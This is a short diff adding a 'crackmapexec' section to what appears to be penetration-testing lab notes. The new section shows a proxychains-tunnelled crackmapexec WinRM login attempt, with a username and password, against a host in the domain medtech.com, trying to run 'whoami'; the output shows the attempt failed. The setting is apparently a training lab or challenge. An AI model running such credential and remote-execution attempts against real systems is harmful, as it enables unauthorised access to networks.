@@ -508,3 +508,12 @@ PS C:\Tools> .\PowerView.ps1
 PS C:\Tools> Import-Module .\PowerView.ps1
 PS C:\Tools>
 ```
+
+### crackmapexec
+
+```
+┌──(rnozaka㉿rnozaka)-[~/Documents/Callenge1]
+└─$ proxychains -q crackmapexec winrm 172.16.204.10 -u "joe" -p "Flowers1" -d medtech.com -X "whoami"
+HTTP        172.16.204.10   5985   172.16.204.10    [*] http://172.16.204.10:5985/wsman
+WINRM       172.16.204.10   5985   172.16.204.10    [-] medtech.com\joe:Flowers1
+```
